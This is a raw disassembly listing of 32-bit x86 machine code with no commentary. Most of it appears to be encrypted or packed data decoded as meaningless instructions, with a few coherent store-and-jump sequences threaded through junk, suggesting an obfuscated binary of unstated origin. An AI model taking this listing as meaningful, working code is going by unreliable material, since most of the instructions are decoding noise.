  403981:	add    BYTE PTR [ebp-0x265319cb],cl
  403987:	mov    edx,0xa4646aa7
  40398c:	or     eax,0xd3fbefb
  403991:	push   ebx
  403992:	sbb    eax,0x85ae41b8
  403997:	pop    ds
  403998:	sub    DWORD PTR [ecx-0x468ede34],ecx
  40399e:	mov    bl,0x4d
  4039a0:	ds mov bh,cl
  4039a3:	shr    DWORD PTR [eax+eax*8],cl
  4039a6:	cwde   
  4039a7:	loop   0x4039c2
  4039a9:	adc    al,0xfb
  4039ab:	add    DWORD PTR [ebx-0x6cc469ce],eax
  4039b1:	jo     0x4039b3
  4039b3:	xor    eax,0x8a1d6f84
  4039b8:	(bad)  
  4039b9:	sub    esi,DWORD PTR [edx+eiz*2-0x44]
  4039bd:	popf   
  4039be:	mov    BYTE PTR [esi+0x6118060a],dl
  4039c4:	sbb    al,0x17
  4039c6:	dec    ebp
  4039c7:	icebp  
  4039c8:	adc    esp,edx
  4039ca:	shr    dl,0xb0
  4039cd:	push   eax
  4039ce:	jmp    0x403985
  4039d0:	mov    esp,0x384a55ed
  4039d5:	push   0x2b6597fd
  4039da:	cwde   
  4039db:	mov    cl,0xf0
  4039dd:	xor    al,0x57
  4039df:	push   ecx
  4039e0:	push   eax
  4039e1:	sbb    al,0x8f
  4039e3:	je     0x4039ff
  4039e5:	jg     0x403a35
  4039e7:	js     0x4039fd
  4039e9:	xchg   esi,eax
  4039ea:	push   cs
  4039eb:	outs   dx,BYTE PTR fs:[esi]
  4039ed:	or     bl,BYTE PTR [edx+0xc]
  4039f0:	jmp    0x544dd3fc
  4039f5:	pop    edx
  4039f6:	dec    esp
  4039f7:	aaa    
  4039f8:	retf   0xd7c4
  4039fb:	cmp    ch,dh
  4039fd:	push   edi
  4039fe:	mov    ebx,0xc533854b
  403a03:	pmullw mm1,QWORD PTR [ebx+edi*1]
  403a07:	aaa    
  403a08:	out    dx,al
  403a09:	push   ebx
  403a0a:	imul   edx,DWORD PTR [ebp+0x2a21f9c7],0xffffffd6
  403a11:	fistp  WORD PTR [edi]
  403a13:	sar    ah,0xaa
  403a16:	imul   esp,DWORD PTR [edi],0x2b515ae
  403a1c:	(bad)  
  403a1d:	aam    0x17
  403a1f:	int    0xf3
  403a21:	push   esi
  403a22:	pop    eax
  403a23:	add    ch,BYTE PTR [ecx+0x57b04a56]
  403a29:	outs   dx,BYTE PTR ds:[esi]
  403a2a:	cli    
  403a2b:	ds push esp
  403a2d:	rcr    dl,cl
  403a2f:	xor    al,BYTE PTR [ebp+0x12e615d]
  403a35:	xchg   esi,eax
  403a36:	daa    
  403a37:	or     eax,0x98d6f155
  403a3c:	jmp    0x4b63f480
  403a41:	je     0x403a6c
  403a43:	ja     0x4039eb
  403a45:	sub    esp,ebx
  403a47:	fnstsw WORD PTR [ecx+0x3d]
  403a4a:	lods   al,BYTE PTR ds:[esi]
  403a4b:	js     0x403aa2
  403a4d:	jmp    0x403a85
  403a4f:	(bad)  
  403a51:	or     BYTE PTR [esi],0x28
  403a54:	scas   eax,DWORD PTR es:[edi]
  403a55:	jno    0x403a4a
  403a57:	add    edi,esp
  403a59:	adc    DWORD PTR [ebp+0x25],esp
  403a5c:	push   ss
  403a5d:	retf   
  403a5e:	lods   eax,DWORD PTR ds:[esi]
  403a5f:	jge    0x4039e7
  403a61:	scas   al,BYTE PTR es:[edi]
  403a62:	fcom   QWORD PTR [ebp-0x60]
  403a65:	xchg   esi,eax
  403a66:	lods   eax,DWORD PTR ds:[esi]
  403a67:	sub    dl,bl
  403a69:	inc    ebp
  403a6a:	push   0x321a4453
  403a6f:	leave  
  403a70:	fcomp  DWORD PTR [ebp+0x2ed4d4b]
  403a76:	(bad)  
  403a78:	hlt    
  403a79:	pop    es
  403a7a:	xchg   BYTE PTR [edx],ah
  403a7c:	pop    ss
  403a7d:	xchg   esp,eax
  403a7e:	mov    ebx,0xf423268e
  403a83:	or     esp,eax
  403a85:	inc    esp
  403a86:	mov    BYTE PTR [ebx-0x50309bdd],cl
  403a8c:	mov    ah,0xe7
  403a8e:	mov    cl,0x66
  403a90:	nop
  403a91:	inc    esp
  403a92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a93:	push   ecx
  403a94:	outs   dx,DWORD PTR ds:[esi]
  403a95:	pop    eax
  403a96:	push   ss
  403a97:	sbb    BYTE PTR [esi],dl
  403a99:	pop    ds
  403a9a:	test   eax,0xc2240c5
  403a9f:	fidiv  WORD PTR [ebx-0x3328f59f]
  403aa5:	leave  
  403aa6:	sub    al,0x8c
  403aa9:	(bad)  
  403aaa:	fcomp  DWORD PTR [eax]
  403aac:	xchg   ebx,eax
  403aad:	test   BYTE PTR [ebp+0xd],ch
  403ab0:	mov    dl,0x9d
  403ab2:	je     0x403a45
  403ab4:	sub    al,0xd0
  403ab6:	pop    edx
  403ab7:	les    esp,FWORD PTR [eax+edx*8+0x67]
  403abb:	cmp    BYTE PTR [edx],al
  403abd:	scas   al,BYTE PTR es:[edi]
  403abe:	in     al,0xdf
  403ac0:	pop    es
  403ac1:	cmc    
  403ac2:	adc    BYTE PTR ds:0xa8d18462,cl
  403ac8:	outs   dx,BYTE PTR ds:[esi]
  403ac9:	jno    0x403a7a
  403acb:	sub    al,0x26
  403acd:	fcomp  DWORD PTR ds:0xe820b743
  403ad3:	ficom  WORD PTR [ebp-0x1d]
  403ad6:	lock in al,0x7c
  403ad9:	aaa    
  403ada:	lods   al,BYTE PTR ds:[esi]
  403adb:	mov    eax,ds:0x5b202970
  403ae0:	pop    esp
  403ae1:	es mov ebx,0x40c8084e
  403ae7:	adc    eax,0xd4113117
  403aec:	sbb    al,dl
  403aee:	scas   al,BYTE PTR es:[edi]
  403aef:	or     al,0x8a
  403af1:	inc    ebp
  403af2:	dec    DWORD PTR [edi]
  403af4:	mov    bh,0xd
  403af6:	imul   esp,edi,0x42
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fdf6
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e1a4,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fd7d,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fd75
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx-0x2bfc1b69],esi
  403b3e:	jle    0x403b05
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0xd770707d
  403b48:	xchg   ebx,eax
  403b49:	dec    ebp
  403b4a:	xor    eax,0xe1841566
  403b4f:	xchg   esp,eax
  403b50:	push   0xffffff98
  403b52:	xchg   ebp,eax
  403b53:	ret    
  403b54:	push   ss
  403b55:	push   edx
  403b56:	daa    
  403b57:	jmp    0x64c8:0x1c2c95a9
  403b5e:	xor    bh,BYTE PTR [ebp+eax*1+0x226e84d6]
  403b65:	or     ebx,DWORD PTR [ebp-0x66]
  403b68:	jns    0x403b92
  403b6a:	jae    0x403bd3
  403b6c:	imul   esi,ebx,0xe
  403b6f:	les    edx,FWORD PTR [ebx+0x5b]
  403b72:	xchg   edi,eax
  403b73:	rol    BYTE PTR [ebp+ebp*1+0x54],0xa2
  403b78:	sub    ch,BYTE PTR [ecx+0x2f]
  403b7b:	loope  0x403b66
  403b7d:	test   BYTE PTR [ecx+ecx*2],0xdb
  403b81:	push   cs
  403b82:	and    ecx,ebp
  403b84:	mov    eax,0xee587dd1
  403b89:	push   cs
  403b8a:	lods   eax,DWORD PTR ds:[esi]
  403b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b8c:	(bad)  
  403b8d:	push   ecx
  403b8e:	mov    al,ds:0xeb1cafb0
  403b93:	fistp  DWORD PTR [edx]
  403b95:	cs retf 0x54df
  403b99:	mov    ds:0xe1c0c4a2,al
  403b9e:	aam    0xe
  403ba0:	or     al,0xe8
  403ba2:	sbb    BYTE PTR [ebp-0x57abeec],ah
  403ba8:	pop    ebp
  403ba9:	pop    es
  403baa:	add    al,0x38
  403bac:	je     0x403b70
  403bae:	cmp    dh,ah
  403bb0:	rcr    al,cl
  403bb2:	mov    cl,bh
  403bb4:	push   ss
  403bb5:	fimul  WORD PTR [edx-0x4b5a1a35]
  403bbb:	mov    si,0xd69
  403bbf:	les    edx,FWORD PTR [ebp+0x622ff79f]
  403bc5:	out    dx,eax
  403bc6:	cmp    dl,BYTE PTR [eax]
  403bc8:	mov    cs:0x5c9d5e36,al
  403bce:	xchg   esp,eax
  403bcf:	call   0x675ced04
  403bd4:	js     0x403b5e
  403bd6:	inc    eax
  403bd7:	mov    al,ds:0x3fac5eaf
  403bdc:	sub    edi,ebx
  403bde:	xchg   edi,eax
  403bdf:	pop    ebp
  403be0:	scas   eax,DWORD PTR es:[edi]
  403be1:	add    al,0xcf
  403be3:	add    dh,BYTE PTR [ebx]
  403be5:	add    DWORD PTR [ecx+ebx*1-0x2b6fc482],0xffffffd5
  403bed:	popf   
  403bee:	push   0x55
  403bf0:	(bad)  
  403bf1:	es dec edi
  403bf3:	sbb    edx,DWORD PTR [esi]
  403bf5:	inc    ebx
  403bf6:	inc    ebp
  403bf7:	mov    fs:0x8ecb0370,al
  403bfd:	mov    ebp,0xa2ce07a6
  403c02:	push   0x876dcc3d
  403c07:	dec    edx
  403c08:	mov    al,ds:0x9ed0d19c
  403c0d:	imul   eax,DWORD PTR [ebx+0x2c0613de],0x2df155be
  403c17:	(bad)  
  403c18:	mov    esi,0x49958f3f
  403c1d:	bnd jbe 0x403c85
  403c20:	dec    esp
  403c21:	pop    ds
  403c22:	sub    esi,esp
  403c24:	test   al,al
  403c26:	loop   0x403c38
  403c28:	ins    DWORD PTR es:[edi],dx
  403c29:	pop    eax
  403c2a:	hlt    
  403c2b:	popf   
  403c2c:	mov    esi,0xb33f200
  403c31:	mov    eax,ds:0xeb966bae
  403c36:	fisub  WORD PTR [esi+eiz*1-0x78]
  403c3a:	pop    edi
  403c3b:	js     0x403c41
  403c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c3e:	popa   
  403c3f:	add    BYTE PTR [edx],al
  403c41:	pop    edx
  403c42:	mov    ebx,ebx
  403c44:	cmp    al,0x17
  403c46:	cmp    BYTE PTR [edx+0x1a],bl
  403c49:	lahf   
  403c4a:	xor    eax,0xf7c912e9
  403c4f:	dec    DWORD PTR [ebx+ecx*8]
  403c52:	imul   esp,DWORD PTR [edx-0x29820f18],0x34
  403c59:	push   esi
  403c5a:	mov    al,ds:0xa6ecedd7
  403c5f:	and    al,0x87
  403c61:	cmp    al,0xb
  403c63:	push   0xffffffb6
  403c65:	fwait
  403c66:	xor    DWORD PTR [ebx],eax
  403c68:	inc    edi
  403c69:	pusha  
  403c6a:	leave  
  403c6b:	out    0xc5,eax
  403c6d:	mov    edx,DWORD PTR [ebx-0x4c]
  403c70:	jge    0x403c02
  403c72:	hlt    
  403c73:	ds pop ebp
  403c75:	xor    eax,0x230caa45
  403c7a:	add    ebp,DWORD PTR [eax+0x50]
  403c7d:	call   0xa6bf:0x8492487a
  403c84:	fs sahf 
  403c86:	rcl    ah,cl
  403c88:	gs dec esi
  403c8a:	or     ch,0x38
  403c8d:	pop    ebx
  403c8e:	pop    edx
  403c8f:	push   ebp
  403c91:	imul   esp,DWORD PTR [ebx-0x7a],0xffffffb8
  403c95:	add    al,0x2e
  403c97:	mov    ebx,0x35ad87db
  403c9c:	loope  0x403c76
  403c9e:	enter  0xdb5f,0xfc
  403ca2:	add    eax,DWORD PTR [esp+edx*2+0x3c556a4d]
  403ca9:	jae    0x403c91
  403cab:	ja     0x403ca1
  403cad:	cmp    esp,DWORD PTR [edi-0x57]
  403cb0:	in     al,dx
  403cb1:	xor    dl,BYTE PTR [edx]
  403cb3:	fidiv  WORD PTR [ebx]
  403cb5:	dec    esi
  403cb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cb7:	mov    al,0x5
  403cb9:	arpl   WORD PTR [edi],dx
  403cbb:	or     al,0xd7
  403cbd:	fs icebp 
  403cbf:	xlat   BYTE PTR ds:[ebx]
  403cc1:	outs   dx,DWORD PTR ds:[esi]
  403cc2:	xchg   esi,eax
  403cc3:	fist   DWORD PTR [edx]
  403cc5:	and    bl,BYTE PTR [edi+0x39765c16]
  403ccb:	xchg   ebp,eax
  403ccc:	jmp    0xf5654702
  403cd1:	inc    edi
  403cd2:	dec    ebx
  403cd3:	xor    eax,0x46e58d81
  403cd8:	call   FWORD PTR [edi+0x78da30bf]
  403cde:	mov    ebp,0x515b976
  403ce3:	jge    0x403c77
  403ce5:	xchg   ebx,eax
  403ce6:	cmc    
  403ce7:	call   0xf473:0x77a20a0d
  403cee:	and    esi,DWORD PTR [esi+esi*2-0x6f]
  403cf2:	retf   
  403cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cf4:	jmp    0x403cf2
  403cf6:	jg     0x403cf9
  403cf8:	ins    DWORD PTR es:[edi],dx
  403cf9:	mov    esi,0xc003b65
  403cfe:	scas   al,BYTE PTR es:[edi]
  403cff:	pop    edi
  403d00:	jp     0x403cc0
  403d02:	push   ebx
  403d03:	mov    bh,0x2f
  403d05:	lods   eax,DWORD PTR ds:[esi]
  403d06:	dec    edi
  403d07:	ja     0x403d10
  403d09:	xchg   ebp,eax
  403d0a:	and    al,0x1e
  403d0c:	sahf   
  403d0d:	ror    BYTE PTR [ecx],cl
  403d0f:	(bad)  
  403d10:	cmp    BYTE PTR [esi],bh
  403d12:	push   edx
  403d13:	cmovnp esi,DWORD PTR [edx+0x28]
  403d17:	push   cs
  403d18:	xchg   ebx,eax
  403d19:	mov    bh,BYTE PTR [ebp+0xac0c697]
  403d1f:	in     eax,0x51
  403d21:	repz mov ebp,0xa4a42e95
  403d27:	rcl    DWORD PTR [ecx],cl
  403d29:	push   edx
  403d2a:	pop    ebp
  403d2b:	pop    edi
  403d2c:	clc    
  403d2d:	shl    DWORD PTR [ebp-0x71],1
  403d30:	adc    al,0xfe
  403d32:	mov    eax,0x8c0abcc7
  403d37:	gs inc esp
  403d39:	push   ecx
  403d3a:	push   edx
  403d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d3c:	sub    dl,dl
  403d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d3f:	daa    
  403d40:	cmp    edi,edx
  403d42:	or     bl,BYTE PTR [eax+0x5b063995]
  403d48:	xlat   BYTE PTR ds:[ebx]
  403d49:	popa   
  403d4a:	inc    ebp
  403d4b:	cmc    
  403d4c:	(bad)  [edi]
  403d4e:	or     eax,0x197f8f37
  403d53:	sub    eax,0x533d1598
  403d58:	inc    esp
  403d59:	push   0xa0febe0d
  403d5e:	arpl   cx,ax
  403d60:	pop    ss
  403d61:	fcom   QWORD PTR [ebx+0x1d]
  403d64:	sbb    DWORD PTR [ebx-0x5b],esp
  403d67:	sub    BYTE PTR [esi+0x6f],ch
  403d6a:	and    eax,0x5eda04ed
  403d6f:	data16 and BYTE PTR [ebp+0x6ae74cf7],al
  403d76:	aad    0x23
  403d78:	cmp    DWORD PTR [edi],edx
  403d7a:	fild   QWORD PTR [ebp-0x9]
  403d7d:	sub    ah,BYTE PTR [edi-0x43e386b1]
  403d83:	addr16 stc 
  403d85:	inc    ebx
  403d86:	sbb    eax,DWORD PTR [edx+0x43]
  403d89:	or     bl,BYTE PTR [esp+esi*8+0x656deb9f]
  403d90:	jbe    0x403ddd
  403d92:	out    dx,eax
  403d93:	pop    eax
  403d94:	add    eax,0xc62e69c4
  403d99:	sbb    ah,BYTE PTR [ecx-0x4c576a2a]
  403d9f:	dec    ebx
  403da0:	adc    edx,DWORD PTR [edx+esi*8-0x2f47165d]
  403da7:	call   FWORD PTR [esi-0x3c89ec]
  403dad:	and    al,0x54
  403daf:	mov    bl,0x4c
  403db1:	cmp    esi,DWORD PTR [ecx+0x7ecc9c6d]
  403db7:	cs ret 
  403db9:	xchg   edi,eax
  403dba:	cmp    BYTE PTR [esi+ebx*4-0xd2067e9],ah
  403dc1:	aaa    
  403dc2:	and    ebp,esi
  403dc4:	hlt    
  403dc5:	sub    al,0x9e
  403dc7:	xchg   edx,eax
  403dc8:	arpl   di,ax
  403dca:	push   edi
  403dcb:	push   ebx
  403dcc:	push   esi
  403dcd:	jnp    0x403dfe
  403dcf:	jecxz  0x403df9
  403dd1:	xor    BYTE PTR [esi-0x3b43ee79],bl
  403dd7:	test   DWORD PTR [ecx],0xd3615a2e
  403ddd:	test   DWORD PTR [esi],0xf68bd3be
  403de3:	push   edx
  403de4:	xor    eax,0x1bde0028
  403de9:	int    0x40
  403deb:	push   ebp
  403dec:	outs   dx,BYTE PTR ds:[esi]
  403ded:	push   edi
  403dee:	inc    ebp
  403def:	push   0xd913c6eb
  403df4:	mov    dl,0xbc
  403df6:	pop    ds
  403df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403df8:	in     eax,dx
  403df9:	fcomp  QWORD PTR [edi+esi*4-0x4e01dfe8]
  403e00:	ins    BYTE PTR es:[edi],dx
  403e01:	jo     0x403db1
  403e03:	jmp    0xb1ba3861
  403e08:	fs jmp 0xf6ef:0x3e363ac3
  403e10:	mov    eax,cs:0xb5447e4f
  403e16:	jo     0x403e12
  403e18:	cmp    al,0x4b
  403e1a:	xor    BYTE PTR [ebp+0x77],ch
  403e1d:	add    DWORD PTR [edx-0x2cc753db],edi
  403e23:	sbb    bl,BYTE PTR [esi-0x67]
  403e26:	loope  0x403e0a
  403e28:	jnp    0x403e77
  403e2a:	nop
  403e2b:	xlat   BYTE PTR ds:[ebx]
  403e2c:	int3   
  403e2d:	sti    
  403e2e:	xor    DWORD PTR [ebx+0x49d065b2],edx
  403e34:	clc    
  403e35:	fwait
  403e36:	std    
  403e37:	inc    esi
  403e38:	iret   
  403e39:	sbb    ebp,DWORD PTR [eax-0x29]
  403e3c:	sbb    eax,edx
  403e3e:	pop    ss
  403e3f:	push   esi
  403e40:	js     0x403e48
  403e42:	mov    eax,0x69404a4
  403e47:	push   0x73
  403e49:	fwait
  403e4a:	hlt    
  403e4b:	(bad)  
  403e4c:	cli    
  403e4d:	xchg   esp,eax
  403e4e:	mov    al,ds:0x52c2250f
  403e53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e54:	loop   0x403e8d
  403e56:	cmp    eax,0x89969b5b
  403e5b:	fucomp st(0)
  403e5d:	neg    BYTE PTR [ecx+eiz*1-0x4b]
  403e61:	sbb    esp,DWORD PTR [edi]
  403e63:	popf   
  403e64:	scas   eax,DWORD PTR es:[edi]
  403e65:	nop
  403e66:	add    BYTE PTR [eax+eax*1],ah
  403e69:	pop    esi
  403e6a:	mov    eax,ds:0xe5741a03
  403e6f:	pop    edx
  403e70:	out    0x8a,eax
  403e72:	xchg   edi,eax
  403e73:	push   ecx
  403e74:	push   eax
  403e75:	push   ebp
  403e76:	jae    0x403e31
  403e78:	stos   BYTE PTR es:[edi],al
  403e79:	scas   al,BYTE PTR es:[edi]
  403e7a:	je     0x403e94
  403e7c:	lock lea edi,[ecx-0x69]
  403e80:	sar    edx,1
  403e82:	sbb    bh,BYTE PTR [ebx+ebp*8+0x2aa64fa7]
  403e89:	retf   
  403e8a:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403e91:	mov    eax,DWORD PTR [ebp-0x8]
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e19c
  403ea2:	adc    DWORD PTR ds:0x42e78f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fdf2,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd85,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e76f,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x73e81c35
  403eec:	cmp    edx,ebx
  403eee:	sbb    BYTE PTR [ebx],0x70
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403f36
  403ef7:	xchg   ebx,eax
  403ef8:	ret    0x2ef1
  403efb:	(bad)  [eax-0x35]
  403efe:	js     0x403f22
  403f00:	test   edi,esi
  403f02:	cs aaa 
  403f04:	ret    0xc9dd
  403f07:	cdq    
  403f08:	and    esp,ecx
  403f0a:	call   0x4d7f9075
  403f0f:	pop    ecx
  403f10:	or     eax,0xd473d09e
  403f15:	(bad)  
  403f16:	pop    edx
  403f17:	add    ebp,DWORD PTR [ecx-0x4ca0ba02]
  403f1d:	xchg   DWORD PTR [ecx],esi
  403f1f:	xor    al,0xce
  403f21:	je     0x403f21
  403f23:	test   eax,0x8922555b
  403f28:	ror    BYTE PTR [edi+0x75f39b1c],cl
  403f2e:	cmp    al,0xfe
  403f30:	(bad)  
  403f31:	shr    DWORD PTR [edi-0x46caf74c],cl
  403f37:	xor    bl,BYTE PTR [esp+eiz*8-0x5bffa575]
  403f3e:	mov    ds:0xef2a7d2e,al
  403f43:	pop    ebx
  403f44:	ja     0x403f4b
  403f46:	jae    0x403f0f
  403f48:	lods   eax,DWORD PTR ds:[esi]
  403f49:	clc    
  403f4a:	xor    DWORD PTR [esi-0x7e98935c],ecx
  403f50:	xchg   DWORD PTR [ebx-0x76133f52],edi
  403f56:	cmp    ebx,DWORD PTR [ecx-0xf7f3beb]
  403f5c:	sbb    eax,0xa0dad201
  403f61:	in     eax,0x1c
  403f63:	dec    edi
  403f64:	loopne 0x403fd2
  403f66:	mov    eax,0xc3e6cca8
  403f6b:	or     ebp,edi
  403f6d:	rcl    dh,0xbf
  403f70:	and    BYTE PTR [edx],dl
  403f72:	pop    esp
  403f73:	mov    cl,0x74
  403f75:	xchg   ecx,eax
  403f76:	push   es
  403f77:	push   ds
  403f78:	sub    BYTE PTR [esi],bl
  403f7a:	(bad)  
  403f7b:	addr16 or eax,0x1de6eced
  403f81:	nop
  403f82:	out    0x44,al
  403f84:	sahf   
  403f85:	pop    ss
  403f86:	jb     0x403f80
  403f88:	cmp    eax,0x73f2ba10
  403f8d:	repz das 
  403f8f:	cs xchg ebp,eax
  403f91:	push   edi
  403f92:	or     DWORD PTR [esp+ebp*1],ebp
  403f95:	mov    edi,0xe049a43c
  403f9a:	call   0xf06e4f3f
  403f9f:	stos   BYTE PTR es:[edi],al
  403fa0:	sub    DWORD PTR [eax],edx
  403fa2:	mov    edx,0x27e0e067
  403fa7:	mov    dh,0x28
  403fa9:	cld    
  403faa:	jg     0x403f9d
  403fac:	adc    DWORD PTR [ebx],eax
  403fae:	cwde   
  403faf:	jl     0x403f9d
  403fb1:	dec    esp
  403fb2:	jl     0x403fb2
  403fb4:	ja     0x403ffe
  403fb6:	jg     0x403fed
  403fb8:	adc    eax,0x5515eb83
  403fbd:	das    
  403fbe:	test   BYTE PTR es:[edi],ch
  403fc1:	fidiv  WORD PTR [ebp-0x5b]
  403fc4:	mov    eax,ds:0xc6927232
  403fc9:	mov    WORD PTR [ecx],ds
  403fcb:	push   ecx
  403fcc:	mov    bh,0xc6
  403fce:	outs   dx,BYTE PTR ds:[esi]
  403fcf:	xchg   ebx,eax
  403fd0:	pop    ss
  403fd1:	cmp    al,BYTE PTR [edx+0x4c75a12b]
  403fd7:	jno    0x40403b
  403fd9:	(bad)  
  403fda:	adc    eax,0x575346c5
  403fdf:	pop    eax
  403fe0:	cld    
  403fe1:	(bad)  
  403fe2:	fstp   st(2)
  403fe4:	mov    ebx,0x5574db0
  403fe9:	ins    DWORD PTR es:[edi],dx
  403fea:	std    
  403feb:	push   ds
  403fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fed:	cmp    edx,edi
  403fef:	stos   BYTE PTR es:[edi],al
  403ff0:	or     BYTE PTR [edx],ah
  403ff2:	mov    ecx,0xe377ab77
  403ff7:	jbe    0x40403c
  403ff9:	fmul   DWORD PTR [ebx+0x5fee1464]
  403fff:	xchg   ch,ch
  404001:	mov    cl,BYTE PTR [eax+0x585e7025]
  404007:	mov    es,WORD PTR [esi-0x4fc5af09]
  40400d:	sub    edi,DWORD PTR [ebx+0x5b]
  404010:	aam    0x2b
  404012:	ins    BYTE PTR es:[edi],dx
  404013:	hlt    
  404014:	xor    eax,0xc663182f
  404019:	mov    ecx,0xd17aaa24
  40401e:	push   esp
  40401f:	cmp    bl,BYTE PTR [eax+eiz*2+0x43e836da]
  404026:	adc    BYTE PTR [edx+eax*4],0x6c
  40402a:	mov    WORD PTR [esi+0xe],ss
  40402d:	push   edx
  40402e:	retf   0x7925
  404031:	xchg   ebx,eax
  404032:	xor    eax,0x650e6c8e
  404037:	or     eax,0x7a2909d7
  40403c:	mov    edx,eax
  40403e:	lock ret 0x57d1
  404042:	es and al,0x83
  404045:	jecxz  0x404023
  404047:	push   ss
  404048:	shl    DWORD PTR [eax+0x55204d7a],0xd8
  40404f:	and    BYTE PTR [ebx-0x2dcbeda1],bh
  404055:	pop    ebp
  404056:	mov    BYTE PTR gs:[eax],cl
  404059:	jb     0x404096
  40405b:	sbb    al,0xdd
  40405d:	loopne 0x404040
  40405f:	sbb    DWORD PTR [edi-0x1],edx
  404062:	repz dec ecx
  404064:	xor    esi,DWORD PTR [edi+0x4f]
  404067:	sti    
  404068:	adc    edx,esi
  40406a:	dec    ebx
  40406b:	in     al,0x5f
  40406d:	in     al,0xc6
  40406f:	mov    ebp,0x171b560a
  404074:	outs   dx,DWORD PTR ds:[esi]
  404075:	gs xor al,0xf3
  404078:	mov    ecx,0xd7e0fdde
  40407d:	jbe    0x4040e9
  40407f:	sub    DWORD PTR ds:0x74166aa,0x70ed2d2e
  404089:	int3   
  40408a:	dec    ebp
  40408b:	mov    ds:0xa217862c,eax
  404090:	sbb    al,0xd3
  404092:	cmp    BYTE PTR [edi+0x22],0xe7
  404096:	int    0x92
  404098:	hlt    
  404099:	push   ecx
  40409a:	xchg   ecx,eax
  40409b:	cmp    eax,0xd74f5f66
  4040a0:	push   esp
  4040a1:	and    bh,BYTE PTR [eax]
  4040a3:	or     ebx,DWORD PTR [esi+0x3f]
  4040a6:	ins    DWORD PTR es:[edi],dx
  4040a7:	add    al,0x63
  4040a9:	mov    ebp,DWORD PTR [esi+0x1a]
  4040ac:	(bad)  
  4040ad:	pop    edx
  4040ae:	repnz and al,0x65
  4040b1:	and    al,0x8c
  4040b3:	and    ecx,DWORD PTR [ecx+ecx*4-0x7ff71acb]
  4040ba:	ffree  st(3)
  4040bc:	shr    DWORD PTR ds:0xfc42bba7,cl
  4040c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040c3:	outs   dx,BYTE PTR ds:[esi]
  4040c4:	or     al,0x82
  4040c6:	sti    
  4040c7:	or     dh,BYTE PTR [ebx-0x7c]
  4040ca:	aad    0xf1
  4040cc:	push   es
  4040cd:	or     al,0xf4
  4040cf:	int    0x22
  4040d1:	pop    ss
  4040d2:	push   0x39992d7e
  4040d7:	mov    ecx,0x3fd2a061
  4040dc:	add    esi,DWORD PTR [ebx]
  4040de:	mov    al,0x32
  4040e0:	cwde   
  4040e1:	dec    esi
  4040e2:	fsubr  QWORD PTR [edx+0x2abf231d]
  4040e8:	pusha  
  4040e9:	and    eax,0xb229b9df
  4040ee:	outs   dx,BYTE PTR ds:[esi]
  4040ef:	js     0x4040ae
  4040f1:	jmp    0x404097
  4040f3:	dec    eax
  4040f4:	and    edx,ebp
  4040f6:	lds    eax,FWORD PTR [ecx-0x2b1f03da]
  4040fc:	lea    ecx,[ebp+0xa]
  4040ff:	inc    ebp
  404100:	push   ecx
  404101:	das    
  404102:	xchg   esp,eax
  404103:	lods   al,BYTE PTR ds:[esi]
  404104:	pop    ecx
  404105:	cli    
  404106:	add    eax,0xacb7a5ce
  40410b:	cmc    
  40410c:	ss mov esi,0xd6c31a5c
  404112:	or     DWORD PTR [ecx],ebp
  404114:	test   al,0x81
  404116:	ss gs push ecx
  404119:	dec    esi
  40411a:	mov    bh,0xfd
  40411c:	xor    BYTE PTR [edi-0x52],bh
  40411f:	mov    WORD PTR [ebx-0x29],ds
  404122:	mov    fs,WORD PTR [edi]
  404124:	xor    al,0x72
  404126:	mov    edi,0xe5740aee
  40412b:	dec    ebx
  40412c:	jo     0x4040b4
  40412e:	mov    gs,esi
  404130:	push   0xffffffa7
  404132:	mov    bl,dl
  404134:	cmp    DWORD PTR [ecx-0x5c],esi
  404137:	imul   ecx,edi,0xffffff84
  40413a:	or     eax,0x6cde2cd3
  40413f:	pop    ecx
  404140:	add    al,0xc1
  404142:	pop    ebp
  404143:	repnz mov WORD PTR [ebp+0x5216e4ec],es
  40414a:	arpl   WORD PTR [eax+0x50],si
  40414d:	test   BYTE PTR [eax-0x720bd077],0x4f
  404154:	mov    WORD PTR [ebp+0x8],?
  404157:	and    eax,0x8ee3db28
  40415c:	cmc    
  40415d:	loopne 0x40413a
  40415f:	call   0xfdcf:0x49e57348
  404166:	inc    ebp
  404167:	adc    al,0xa0
  404169:	xchg   ebp,eax
  40416a:	xor    eax,0xf65788c9
  40416f:	sub    BYTE PTR [edx],dh
  404171:	pop    ecx
